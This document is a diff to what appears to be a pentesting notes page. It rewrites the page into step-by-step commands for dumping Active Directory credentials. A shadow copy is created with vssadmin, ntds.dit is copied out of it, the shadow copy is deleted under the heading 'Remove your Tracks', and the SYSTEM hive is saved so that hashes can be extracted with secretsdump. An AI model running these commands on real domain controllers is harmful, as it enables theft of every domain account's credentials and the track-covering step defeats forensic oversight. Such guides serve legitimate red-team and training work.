@@ -13,6 +13,8 @@ weight : 0
 
 On Domain Controller - create snapshot with `vssadmin.exe`.
 
+### Step 1 - Create ShadowCopy
+
 ```plain
 PS C:\temp> vssadmin.exe create shadow /for=C:
 vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
@@ -21,31 +23,33 @@ vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
 Successfully created shadow copy for 'C:\'
     Shadow Copy ID: {3d781b5d-e053-41ad-85d4-5b8f1ffb2d42}
     Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5
-PS C:\temp>
 ```
 
-To make it easy for yourself and extract the `ntds.dit` and `SYSTEM` file from the ShadowCopy, you can use [ShadowCopyView](https://www.nirsoft.net/utils/shadow_copy_view.html)
+### Step 2 - Copy NTDS.dit from ShadowCopy
+
+```plain
+PS C:\temp> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\ntds\ntds.dit c:\temp\ntds.dit
+```
+
+You can also use [ShadowCopyView](https://www.nirsoft.net/utils/shadow_copy_view.html) if you prefer a GUI.
 
 {{%attachments fa_icon_class="far fa-file-archive" pattern=".*(zip)"/%}}
 
-### Copy NTDS.dit
+### Step 3 - Remove your Tracks
 
-Path: `C:\Windows\NTDS\ntds.dit`
+```plain
+PS C:\temp> vssadmin delete shadows /shadow={3d781b5d-e053-41ad-85d4-5b8f1ffb2d42}
+```
 
-![example](images/example1.png)
+### Step 4 - Save the SYSTEM file
 
-### Copy SYSTEM
+Save the `SYSTEM` file.
 
-Path: `C:\Windows\System32\config\SYSTEM`
+```plain
+reg SAVE HKLM\SYSTEM c:\temp\SYSTEM
+```
 
-Preferably you want to also make a copy of:
-
-* SECURITY - `C:\Windows\System32\config\SECURITY`
-* SAM - `C:\Windows\System32\config\SAM`
-
-![example](images/example2.png)
-
-### Extract hashes
+## Extract hashes
 
 It can happen that [secretsdump.py]({{< ref"secretsdump-py" >}}) keeps looping and throwing out hashes. In this case, or maybe even preferably, use [Gosecretsdump]({{< ref "gosecretsdump" >}}).
 
